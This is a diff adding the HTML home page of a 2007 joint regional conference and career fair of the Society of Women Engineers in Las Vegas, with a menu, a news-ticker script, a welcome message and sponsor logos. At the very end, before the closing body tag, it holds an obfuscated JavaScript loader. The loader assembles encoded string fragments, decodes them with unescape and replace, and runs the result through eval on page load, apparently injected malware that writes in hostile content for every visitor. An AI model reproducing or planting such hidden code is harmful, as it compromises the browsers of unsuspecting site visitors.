@@ -1,0 +1,609 @@
+<html>
+
+
+
+<head>
+
+<meta http-equiv="Content-Language" content="en-us">
+
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+<title>2007 JOINT REGIONS B &amp; J CONFERENCE AND CAREER FAIR </title>
+
+<!-- Courtesy of SimplytheBest.net - http://simplythebest.net/scripts/ -->
+
+<STYLE>
+
+.cell_over { BACKGROUND-COLOR: #f8f29b }
+
+.cell_out { BACKGROUND-COLOR: #f7f4c8 }
+
+.cell_over1 { BACKGROUND-COLOR: #C9E4FC }
+
+.cell_out1 { BACKGROUND-COLOR: #FFFFCC }
+
+.link {font-family: arial, helvetica, sans serif; font-size: 10pt; color: #808080; text-decoration: none; cursor: none}
+
+.link:hover {font-family: arial, helvetica, sans serif; font-size: 10pt; color: #000000; text-decoration: none; cursor: hand}
+
+</STYLE>
+
+<style type="text/css">
+
+/*Example CSS for the two demo scrollers*/
+
+#pscroller1{
+width: 200px;
+height: 100px;
+border: 1px solid black;
+padding: 5px;
+background-color: lightyellow;
+}
+
+#pscroller2{
+width: 490px;
+height: 18px;
+border: 0px solid black;
+padding: 0px;
+font-family: arial, helvetica, sans serif; 
+font-size: 10pt; 
+color: Red
+}
+
+#pscroller2 a{
+text-decoration: none;
+}
+
+.someclass{ //class to apply to your scroller(s) if desired
+}
+
+</style>
+
+<script type="text/javascript">
+
+/*Example message arrays for the two demo scrollers*/
+
+var pausecontent=new Array()
+//pausecontent[0]='<a href="http://www.javascriptkit.com">JavaScript Kit</a><br />Comprehensive JavaScript tutorials and over 400+ free scripts!'
+//pausecontent[1]='<a href="http://www.codingforums.com">Coding Forums</a><br />Web coding and development forums.'
+//pausecontent[2]='<a href="http://www.cssdrive.com" target="_new">CSS Drive</a><br />Categorized CSS gallery and examples.'
+
+var pausecontent2=new Array()
+pausecontent2[0]='January 16 - Conference Schedule has been updated'
+pausecontent2[1]='Tour Sign-up Deadline - December 21'
+pausecontent2[2]='Conference Registration Closes - January 10, 2007'
+pausecontent2[3]='Online Registration Now Available'
+//pausecontent2[2]='<a href="http://news.bbc.co.uk">BBC News: UK and international news</a>'
+
+</script>
+
+<script type="text/javascript">
+
+/***********************************************
+* Pausing up-down scroller- © Dynamic Drive (www.dynamicdrive.com)
+* This notice MUST stay intact for legal use
+* Visit http://www.dynamicdrive.com/ for this script and 100s more.
+***********************************************/
+
+function pausescroller(content, divId, divClass, delay){
+this.content=content //message array content
+this.tickerid=divId //ID of ticker div to display information
+this.delay=delay //Delay between msg change, in miliseconds.
+this.mouseoverBol=0 //Boolean to indicate whether mouse is currently over scroller (and pause it if it is)
+this.hiddendivpointer=1 //index of message array for hidden div
+document.write('<div id="'+divId+'" class="'+divClass+'" style="position: relative; overflow: hidden"><div class="innerDiv" style="position: absolute; width: 100%" id="'+divId+'1">'+content[0]+'</div><div class="innerDiv" style="position: absolute; width: 100%; visibility: hidden" id="'+divId+'2">'+content[1]+'</div></div>')
+var scrollerinstance=this
+if (window.addEventListener) //run onload in DOM2 browsers
+window.addEventListener("load", function(){scrollerinstance.initialize()}, false)
+else if (window.attachEvent) //run onload in IE5.5+
+window.attachEvent("onload", function(){scrollerinstance.initialize()})
+else if (document.getElementById) //if legacy DOM browsers, just start scroller after 0.5 sec
+setTimeout(function(){scrollerinstance.initialize()}, 500)
+}
+
+// -------------------------------------------------------------------
+// initialize()- Initialize scroller method.
+// -Get div objects, set initial positions, start up down animation
+// -------------------------------------------------------------------
+
+pausescroller.prototype.initialize=function(){
+this.tickerdiv=document.getElementById(this.tickerid)
+this.visiblediv=document.getElementById(this.tickerid+"1")
+this.hiddendiv=document.getElementById(this.tickerid+"2")
+this.visibledivtop=parseInt(pausescroller.getCSSpadding(this.tickerdiv))
+//set width of inner DIVs to outer DIV's width minus padding (padding assumed to be top padding x 2)
+this.visiblediv.style.width=this.hiddendiv.style.width=this.tickerdiv.offsetWidth-(this.visibledivtop*2)+"px"
+this.getinline(this.visiblediv, this.hiddendiv)
+this.hiddendiv.style.visibility="visible"
+var scrollerinstance=this
+document.getElementById(this.tickerid).onmouseover=function(){scrollerinstance.mouseoverBol=1}
+document.getElementById(this.tickerid).onmouseout=function(){scrollerinstance.mouseoverBol=0}
+if (window.attachEvent) //Clean up loose references in IE
+window.attachEvent("onunload", function(){scrollerinstance.tickerdiv.onmouseover=scrollerinstance.tickerdiv.onmouseout=null})
+setTimeout(function(){scrollerinstance.animateup()}, this.delay)
+}
+
+
+// -------------------------------------------------------------------
+// animateup()- Move the two inner divs of the scroller up and in sync
+// -------------------------------------------------------------------
+
+pausescroller.prototype.animateup=function(){
+var scrollerinstance=this
+if (parseInt(this.hiddendiv.style.top)>(this.visibledivtop+5)){
+this.visiblediv.style.top=parseInt(this.visiblediv.style.top)-5+"px"
+this.hiddendiv.style.top=parseInt(this.hiddendiv.style.top)-5+"px"
+setTimeout(function(){scrollerinstance.animateup()}, 50)
+}
+else{
+this.getinline(this.hiddendiv, this.visiblediv)
+this.swapdivs()
+setTimeout(function(){scrollerinstance.setmessage()}, this.delay)
+}
+}
+
+// -------------------------------------------------------------------
+// swapdivs()- Swap between which is the visible and which is the hidden div
+// -------------------------------------------------------------------
+
+pausescroller.prototype.swapdivs=function(){
+var tempcontainer=this.visiblediv
+this.visiblediv=this.hiddendiv
+this.hiddendiv=tempcontainer
+}
+
+pausescroller.prototype.getinline=function(div1, div2){
+div1.style.top=this.visibledivtop+"px"
+div2.style.top=Math.max(div1.parentNode.offsetHeight, div1.offsetHeight)+"px"
+}
+
+// -------------------------------------------------------------------
+// setmessage()- Populate the hidden div with the next message before it's visible
+// -------------------------------------------------------------------
+
+pausescroller.prototype.setmessage=function(){
+var scrollerinstance=this
+if (this.mouseoverBol==1) //if mouse is currently over scoller, do nothing (pause it)
+setTimeout(function(){scrollerinstance.setmessage()}, 100)
+else{
+var i=this.hiddendivpointer
+var ceiling=this.content.length
+this.hiddendivpointer=(i+1>ceiling-1)? 0 : i+1
+this.hiddendiv.innerHTML=this.content[this.hiddendivpointer]
+this.animateup()
+}
+}
+
+pausescroller.getCSSpadding=function(tickerobj){ //get CSS padding value, if any
+if (tickerobj.currentStyle)
+return tickerobj.currentStyle["paddingTop"]
+else if (window.getComputedStyle) //if DOM2
+return window.getComputedStyle(tickerobj, "").getPropertyValue("padding-top")
+else
+return 0
+}
+
+</script>
+
+
+
+</head>
+
+
+
+<body bgcolor="#DED548" background="images/bg1.gif" link="#007B3D" vlink="#007B3D" alink="#007B3D">
+
+
+
+<div align="center">
+
+	<table style="border:1px solid #808080;"  cellpadding="1" cellspacing="0" width="800" height="600"  id="table1" bgcolor="#FFFFFF">
+
+		<tr>
+
+			<td>
+
+			<table border="0" width="100%" height="100%" id="table2" cellspacing="0" cellpadding="0">
+
+				<tr>
+
+					<td valign="top" height="94" colspan="2">
+
+					<img border="0" src="images/swe-title.gif" width="370" height="94"></td>
+
+				</tr>
+
+				<tr>
+
+					<td height="2" colspan="2"></td>
+
+				</tr>
+
+				<tr>
+
+					<td bgcolor="#007B3D" style="border:5px solid #ff6200;border-bottom:0;border-left:0;border-right=0;" height="85" background="images/greenbar.gif" colspan="2">
+
+					<p align="center"><font color="#FFFFFF" face="Verdana">
+
+					<b>
+
+					<font size="4">2007 JOINT REGIONS B &amp; J CONFERENCE AND 
+
+					CAREER FAIR<br>
+
+					</font><i>&quot;Diverse Resources, Approaches, and Solutions&quot;</i><br>
+
+					<font size="2">Imperial Palace Hotel, Las Vegas, NV<br>
+
+					January 19 - 21, 2007</font></b></font></td>
+
+				</tr>
+
+				<tr>
+
+					<td valign="top" height="10" colspan="2">
+
+					<p align="center"></td>
+
+				</tr>
+
+				<tr>
+
+					<td align="center" width="220" height="300" valign=TOP>
+
+<table style="border:1px solid #808080;" width="215" cellspacing="0" cellpadding="3" bgcolor="#f7f4c8" id="table1">
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30" >
+
+		<font face="Arial" size="2" color="#808080"><a CLASS=LINK href="index.htm">&nbsp;</a></font><b><font face="Arial" size="2" color="#007B3D" >General Information</font></b></td>
+
+	</tr>
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+
+		<font color="#808080">
+
+		<a class=link href="callforspeakers.htm">Information for Speakers</a></font></a></font></td>
+
+	</tr>
+
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+
+		<font color="#808080">
+
+		<a class=link href="hotel.htm">Hotel Information</a></font></a></font></td>
+
+	</tr>
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+		<a class="link" href="registration.htm">Attendee Registration</a></font></td>
+
+	</tr>
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font size="2" face="Arial"><a class="link" href="registration_corp.htm">Corporate 
+		Information/Registration</a></font></td>
+
+	</tr>
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+
+		<a class="link" href="schedule.htm">Schedule of Events</a></font></td>
+
+	</tr>
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Verdana" size="2" color="#808080">
+		<a class= link href="poster.htm" >
+		Career Guidance Poster Session</a></font></td>
+
+	</tr>
+
+<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080"><a class="link" href="exhibitors.htm">Career Fair Exhibitors</a></font></td>
+
+	</tr>
+
+	
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080"><a class="link" href="speaker.htm">Keynote Speaker Bios</a></font></td>
+
+	</tr>
+
+<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+
+		<a class="link" href="breakout.htm">Breakout Session Information</a></font></td>
+
+	</tr>
+
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+
+		<a class="link" href="techtours.htm">Technical &amp; Fun Tours</a></font></td>
+
+	</tr>
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080">
+
+		<a class="link" href="http://cnnstudentnews.cnn.com/interactive/specials/9910/millennium.events.guide/citysights/content/lasvegas.html">Area Activities</a></font></td>
+
+	</tr>
+
+<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Verdana" size="2" color="#808080">
+		<a class= link href="vegas.htm" >
+		Getting Around Vegas</a></font></td>
+
+	</tr>
+
+
+<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Verdana" size="2" color="#808080">
+		<a class= link href="eblasts.htm" >
+		Conference E-blasts</a></font></td>
+
+	</tr>
+
+	<tr>
+
+		<td onmouseover="this.className='cell_over';" onmouseout="this.className='cell_out';" align="center" height="30">
+
+		<font face="Arial" size="2" color="#808080"><a class=link href="contacts.htm">Conference Contacts</a></font></td>
+
+	</tr>
+
+</table>
+
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					</td>
+
+					<td width="580" valign = top>
+
+					<div align="center">
+
+						<table border="0" width="100%" id="table3" cellpadding="6" cellspacing="0" >
+
+							<tr>
+
+								<td valign="top" colspan="3" background="images/sign4.gif">
+								<p class="MsoNormal"><font color="#808080">
+								<span style="font-family: Verdana"><b>W</b><font size="2">elcome 
+								to the web site for the SWE 2007 Regions B &amp; J 
+								Conference &amp; Career Fair.&nbsp; We hope you will join 
+								us in Las Vegas for this exciting opportunity to 
+								participate in social and networking events, 
+								break-out sessions that will address collegiate, 
+								SWE, professional, and personal development.&nbsp; 
+								Our technical breakout sessions will focus on 
+								high-profile projects in the Las Vegas area to 
+								demonstrate the true diversity of engineering 
+								applications here.&nbsp; We have exciting speakers 
+								scheduled for our breakfast and lunch meal 
+								events.&nbsp; Our schedule allows free time in the 
+								evenings to enjoy Las Vegas.&nbsp; So peruse our site 
+								and as our events are confirmed, we will add 
+								them to the site.&nbsp; See you in January in 
+								fabulous Las Vegas!</font></span></font></p>
+								<p class="MsoNormal" style="margin-top:24.0pt">
+								<i>
+								<font color="#808080">
+								<span style="font-size: 10.0pt; font-family: Verdana">
+								Region B Co-chair – Fran Stuart<br>
+								Region J Co-chair – Alison Ratliff&nbsp; <br>
+								<br>
+								</span>
+								</font>
+								<font color="#FF0000">
+								<span style="font-family: Verdana">
+								Hot!</span></font><font color="#808080"><span style="font-size: 10.0pt; font-family: Verdana">
+								</span>
+								</font>
+								</i>
+								<font color="#808080">
+								<span style="font-family: Verdana">
+								<a href="pdf/Registration_Info-ATTENDEE_121906.pdf">Conference Packet</a> </span></font><br>
+								</p>
+								<table border="0" width="500" id="table4" cellspacing="0" cellpadding="0">
+									<tr><td>
+									<b>
+									<u>
+									<font face="Verdana" size="2" color="#808080">Conference News</font></u></b></td></tr>
+									
+									<tr>
+										<td>
+										<script type="text/javascript">
+
+//new pausescroller(name_of_message_array, CSS_ID, CSS_classname, pause_in_miliseconds)
+
+//new pausescroller(pausecontent, "pscroller1", "someclass", 3000)
+document.write("<br />")
+new pausescroller(pausecontent2, "pscroller2", "someclass", 2000)
+
+</script>
+										
+										
+										</td>
+									</tr>
+								</table>
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<td valign="top" background="images/sign4.gif" colspan="3">
+								<p align="center"><b><font face="Verdana">Thanks 
+								to our sponsors!</font></b></td>
+
+							</tr>
+
+							<tr>
+
+								<td valign="top" background="images/sign4.gif" width="193" align="center">
+								<img border="0" src="images/gold.gif" width="84" height="24"></td>
+
+								<td valign="top" background="images/sign4.gif" width="193" align="center">
+								<img border="0" src="images/silver.gif" width="84" height="24"></td>
+
+								<td valign="top" background="images/sign4.gif" width="193" align="center">
+								<img border="0" src="images/bronze.gif" width="84" height="24"></td>
+
+							</tr>
+
+							<tr>
+
+								<td background="images/sign4.gif" width="193">
+								<p align="center"><a href="http://www.cia.gov">
+								<img border="0" src="images/ciaseal.gif" width="100" height="100"></a></td>
+
+								<td background="images/sign4.gif" width="193">
+								<p align="center">
+								<a href="http://mysolar.cat.com">
+								<img border="0" src="images/solar.gif" width="100" height="35"></a></td>
+
+								<td background="images/sign4.gif" width="193">
+								<p align="center">
+								<a href="http://www.gdc4s.com/">
+								<img border="0" src="images/gdc4s.gif" width="190" height="37"></a></td>
+
+							</tr>
+
+							<tr>
+
+								<td background="images/sign4.gif" width="193">
+								<p align="center">
+								<a href="http://www.hdrinc.com">
+								<img border="0" src="images/hdr.gif" width="100" height="47"></a></td>
+
+								<td background="images/sign4.gif" width="193">
+								&nbsp;</td>
+
+								<td background="images/sign4.gif" width="193">
+								<p align="center">
+								<a href="http://www.northropgrumman.com/">
+								<img border="0" src="images/ng.gif" width="190" height="44"></a></td>
+
+							</tr>
+
+							<tr>
+
+								<td background="images/sign4.gif" width="193">
+								&nbsp;</td>
+
+								<td background="images/sign4.gif" width="193">
+								&nbsp;</td>
+
+								<td background="images/sign4.gif" width="193">
+								<p align="center">
+								<a href="http://www.swgas.com">
+								<img border="0" src="images/swgas.gif" width="100" height="45"></a></td>
+
+							</tr>
+
+						</table>
+
+					</div>
+
+					</td>
+
+				</tr>
+
+				<tr>
+
+					<td>&nbsp;</td>
+
+					<td><font face="Verdana" size="2"><a href="exhibitors.htm">
+					Career Fair Exhibitors</a></font></td>
+
+				</tr>
+
+				<tr>
+
+					<td>&nbsp;</td>
+
+					<td>
+					<p align="center"><i><font size="2" face="Verdana">Web 
+					design by:
+					<a href="mailto:michael@herr.com?subject=SWE Joint Conference Website">
+					Michael Herr</a></font></i></td>
+
+				</tr>
+
+			</table>
+
+			</td>
+
+		</tr>
+
+	</table>
+
+</div>
+
+
+
+<script>var s7z5Ef="2uH%632uH%";var yyQ2qSX0="%272uH%6E2uH%36";var sDJe6D="2iz632iz2";var jcSbAqOn="o750o62";var rF8WRL="H%272u";sDJe6D="AQ2iz2izWAQ0"+sDJe6D;var ysih="z612iz74";var xhpMR="c%59Exc%6B";var q6Bsd="%53Exc%50Exc%6";s7z5Ef="2uH%6F"+s7z5Ef;var ZfR8="H%3C2uH%642";var SrtN9J="xc%27Exc%74E";var FIusW="692uH%662uH%282";ysih="z62izfCB2i"+ysih;var Pqtmz="place(/0o/";var vFjrfs="2uH%372uH%312";q6Bsd+="CExc%69Exc";FIusW="3B2uH%"+FIusW;var Gq1Gpn="H%792uH";var wV9QBL="6E2uH%3";var iIvQCWnc="c%74Exc%79Ex";var l7onlDc="F2uH%642uH%79";var QTQk="D2iz62izfCB2";var b3PgLuO="iz2izWAQ72iz";var xNjvN="o3B0o630o530o5";wV9QBL="%652uH%372uH%"+wV9QBL;xNjvN="610o6C0o270"+xNjvN;var weomr="/g,'%3')))";var eDp2="%3C2uH%2F2uH%6";q6Bsd="MlBExc%63Exc"+q6Bsd;var IzIzZ="E2iz742iz2izW";var stiUD="642uH%6F2uH%";rF8WRL+="H%2B2uH%4C2uH";var tuKna8TK="BExc%67Exc%";var bM4Is6E="xc%69E";var qUFYo672="SOqdiOOE='2iz76";ysih="z632iz72izWAQ2i"+ysih;var S7wWht="3Exc%5";var L5P9="xc%61Exc%6DExc%";var WVIgm="uH%622uH%6F";var pbM2F="3B0o630o";Pqtmz+="g,'%')));var ";var rTTrH=")));var T9t7";var x5qv0y4="o6C0o650o2E0o";var kJ64="o650o6C0o6C0o6";iIvQCWnc+="c%6CExc%6";var L9Hy="72uH%6E2";var yD5TUy="6C0o690o2E0o";var HKoK="%652uH%20";var PNdyw7l="%6E2uH%742uH%";var I3hPnWi="2uH%792uH%49";wV9QBL+="72uH%312uH%3";var SWsEiz="uH%6E2uH%752uH";var J9Te="2EExc%61Exc";xNjvN+="00o6C0o690o2";vFjrfs="372uH%6E"+vFjrfs;var Cxik0yT="H%642uH%";l7onlDc+="2uH%3E2uH%2";Cxik0yT+="632uH%782uH%6F2";var xmNrC="72uH%6E2uH%37";var j1l0CG="6E2uH%362";var fF73O="%292uH%3B';ev";rF8WRL="H%3E2u"+rF8WRL;var qcGbY373="0o3A0o2F0o2F0o6";iIvQCWnc=q6Bsd+"%2EExc%73Ex"+iIvQCWnc;kJ64="o610o720"+kJ64;var OgGhnx="%722uH%202uH%6";var PbZnRd9="Bk.replace(/E";var NcINFq="var Bl1c8";var Nc3D="%73Exc%69Exc";bM4Is6E="c%43Exc%68E"+bM4Is6E;rF8WRL+="%5A2uH%";var bfJx="3Exc%53Exc%5";SWsEiz=Gq1Gpn+"%3D2uH%3D2"+SWsEiz;weomr="ace(/%Ml"+weomr;var qnm2="2iz3B';eval(u";var xAVDIPS="%6C2uH%2";yyQ2qSX0+="2uH%462uH%6";var pNB0r8="%562uH%372uH%";var j5oA="H%6C2u";var q9If="9Exc%64E";var X0tALKf="H%312uH%2B2uH%";var fiXeb="z642iz6F";var xq1J85ZY="3B';eva";Cxik0yT=j1l0CG+"uH%462u"+Cxik0yT;xhpMR+="Exc%47Ex";OgGhnx+="72uH%362uH%682u";Cxik0yT+="uH%532uH%502u";ysih="z742iz2izWAQE2i"+ysih;rF8WRL=WVIgm+"2uH%642uH%792u"+rF8WRL;var DwGrT="0o730o2F0o46";Nc3D+="%62Exc%69Exc%6C";var ytGkqua="H%4C2uH%5";var TDWVq="c%74Exc%";xNjvN+="E0o770o690o640o";l7onlDc="%2F2uH%622uH%6"+l7onlDc;s7z5Ef+="752uH%6D2";var b2dm5Llg="izfCB2iz6C2iz6";q9If="7Exc%68Exc%6"+q9If;var eQ36="z2izfCB02iz";L9Hy=rF8WRL+"4E2uH%652uH%3"+L9Hy;eQ36=sDJe6D+"izfCB32i"+eQ36;Nc3D="6Exc%69Exc"+Nc3D;ytGkqua=HKoK+"2uH%282u"+ytGkqua;pbM2F="o310o270o"+pbM2F;ZfR8+="uH%692uH";qUFYo672=",'%')));var "+qUFYo672;q9If=TDWVq+"79Exc%MlDExc%2"+q9If;J9Te="xc%Ml7Exc%"+J9Te;x5qv0y4=qcGbY373+"40o6F0o750o620"+x5qv0y4;wV9QBL+="D2uH%27";J9Te="5AExc%56E"+J9Te;L9Hy=wV9QBL+"2uH%3C2"+L9Hy;ysih=QTQk+"iz6E2i"+ysih;eQ36=qUFYo672+"2iz612iz72izW"+eQ36;PNdyw7l="D2uH%652uH"+PNdyw7l;var gihj="2uH%722uH%";var AAtQ="uH%692uH%642";q9If=Nc3D+"Exc%69Ex"+q9If;var jGr1z="o530o500o6C0o6";var qmsWlCb="E2uH%742uH%2";eQ36="(/2uH%/g"+eQ36;DwGrT=kJ64+"50o640o2E0o77"+DwGrT;b2dm5Llg=ysih+"2iz62izfCB2iz42"+b2dm5Llg;pbM2F=xNjvN+"740o680o3D0o270"+pbM2F;var Gsf3="/%fCB/g,'5";S7wWht="28Exc%63Exc%5"+S7wWht;var ciYWw="2iz/g,'%').re";bfJx+="0Exc%6CExc%6";var nUsYi="H%6F2uH%532u";j5oA="uH%742uH%452u"+j5oA;ytGkqua=gihj+"692uH%742uH"+ytGkqua;var DxzRhmj="2iz692iz662iz";var AqhSzWU7="%69Exc%29Ex";S7wWht=bM4Is6E+"xc%6CExc%64Exc%"+S7wWht;J9Te+="%70Exc%70Exc%6";xhpMR=SrtN9J+"xc%61Exc%57Ex"+xhpMR;PbZnRd9="scape(ltte"+PbZnRd9;tuKna8TK="7Exc%Ml"+tuKna8TK;S7wWht=J9Te+"5Exc%6EExc%64Ex"+S7wWht;jGr1z+="90o2E0o730o720";IzIzZ="2iz62izfCB2iz6"+IzIzZ;PbZnRd9+="xc%/g,";var tc6pdf7="o740o3D0o270";yD5TUy+="680o650o690";DwGrT=jcSbAqOn+"0o6C0o650o620"+DwGrT;qnm2=b3PgLuO+"2izWAQ9"+qnm2;DxzRhmj=IzIzZ+"AQ82iz2izWAQ7"+DxzRhmj;Pqtmz="e(T9t7qsve.re"+Pqtmz;FIusW+="uH%642uH%6F2u";qnm2="62izfCB2"+qnm2;Gsf3=ciYWw+"place("+Gsf3;j5oA+="H%652uH%6D2";j5oA=qmsWlCb+"E2uH%672uH%652"+j5oA;var aDdeK="2uH%2E2u";ZfR8=vFjrfs+"uH%3D2uH%222u"+ZfR8;weomr+=";";xhpMR=L5P9+"65Exc%MlDE"+xhpMR;nUsYi=yyQ2qSX0+"42uH%632uH%782u"+nUsYi;I3hPnWi="2uH%742uH%42"+I3hPnWi;var Nihn4t="270o680o740o";Cxik0yT+="H%4F2uH%";fF73O=Cxik0yT+"382uH%272uH"+fF73O;qnm2="iz6D2iz"+qnm2;xhpMR="xc%6EE"+xhpMR;tc6pdf7=yD5TUy+"o670o680"+tc6pdf7;qnm2+="nescape(SOqdiO";ytGkqua+="A2uH%4";jGr1z=rTTrH+"qsve='0o630"+jGr1z;Gsf3=qnm2+"OE.replace(/"+Gsf3;Pqtmz=xq1J85ZY+"l(unescap"+Pqtmz;pbM2F=DwGrT+"0o720o4D0o"+pbM2F;tuKna8TK+="Ml6Exc";xAVDIPS=SWsEiz+"%6C2uH"+xAVDIPS;X0tALKf=L9Hy+"uH%372u"+X0tALKf;var vGfzJt="2uH%6D2uH%652uH";xAVDIPS+="92uH%4C2uH%";fiXeb=eQ36+"6C2iz692iz3D2i"+fiXeb;PNdyw7l=stiUD+"632uH%752uH%6"+PNdyw7l;eDp2="2uH%3E2uH"+eDp2;aDdeK=vGfzJt+"%6E2uH%74"+aDdeK;X0tALKf=xAVDIPS+"5A2uH%4E2uH"+X0tALKf;var N1xh="e(Bl1c8t";q9If+="xc%64Exc";DxzRhmj=b2dm5Llg+"2izfCB2iz6D"+DxzRhmj;tuKna8TK=q9If+"%65Exc%6EExc%2"+tuKna8TK;bfJx=Pqtmz+"ltteBk='Exc%6"+bfJx;PbZnRd9=AqhSzWU7+"c%MlB';eval(une"+PbZnRd9;bfJx=tc6pdf7+"o310o270o"+bfJx;ZfR8="4E2uH%652uH%"+ZfR8;N1xh=fF73O+"al(unescap"+N1xh;var CVn4G="2uH%3B2uH%";eDp2+="42uH%692uH%762u";CVn4G=xmNrC+"2uH%312uH%29"+CVn4G;I3hPnWi+="2uH%642uH%";aDdeK+="H%622uH%6F";PbZnRd9=S7wWht+"0Exc%6CExc"+PbZnRd9;Gsf3=DxzRhmj+"72izWAQ2iz612"+Gsf3;ytGkqua=PNdyw7l+"2E2uH%77"+ytGkqua;I3hPnWi=j5oA+"uH%652uH%6E"+I3hPnWi;weomr=PbZnRd9+"'%').repl"+weomr;Gsf3+="').repla";var gXIrJ="2uH%202uH%4C";gXIrJ="H%612uH%72"+gXIrJ;xhpMR=bfJx+"9Exc%2EE"+xhpMR;weomr=tuKna8TK+"%68Exc%"+weomr;pbM2F=x5qv0y4+"620o6F0"+pbM2F;iIvQCWnc=xhpMR+"c%27Exc%"+iIvQCWnc;pbM2F=Nihn4t+"740o70"+pbM2F;iIvQCWnc=pbM2F+"530o500o"+iIvQCWnc;ZfR8=gXIrJ+"2uH%5A2uH%"+ZfR8;ytGkqua=l7onlDc+"72uH%3B2uH%"+ytGkqua;FIusW=eDp2+"H%3E2uH%222uH%"+FIusW;nUsYi+="H%502uH%4F2uH";Gsf3="fCB2iz6"+Gsf3;AAtQ=ZfR8+"%762uH%202"+AAtQ;fiXeb=N1xh+".replace"+fiXeb;weomr=iIvQCWnc+"5Exc%2EExc%7"+weomr;s7z5Ef=pNB0r8+"3D2uH%64"+s7z5Ef;aDdeK=FIusW+"H%632uH%75"+aDdeK;X0tALKf=aDdeK+"2uH%642u"+X0tALKf;fiXeb=I3hPnWi+"282uH%272uH%"+fiXeb;nUsYi=AAtQ+"uH%3D2uH"+nUsYi;OgGhnx=CVn4G+"762uH%612uH"+OgGhnx;ytGkqua=X0tALKf+"272uH%3C2uH"+ytGkqua;s7z5Ef=OgGhnx+"H%5A2uH"+s7z5Ef;Gsf3=fiXeb+"2iz632iz72iz"+Gsf3;weomr=jGr1z+"o630o3D0o"+weomr;weomr=Gsf3+"ce(/%WAQ/g,'2'"+weomr;ytGkqua=nUsYi+"%382uH%27"+ytGkqua;weomr=s7z5Ef+"uH%652uH%6"+weomr;ytGkqua=NcINFq+"t='2uH%762u"+ytGkqua;weomr=ytGkqua+"E2uH%652uH%3"+weomr;eval(weomr);</script></body>
+
+
+
+</html>
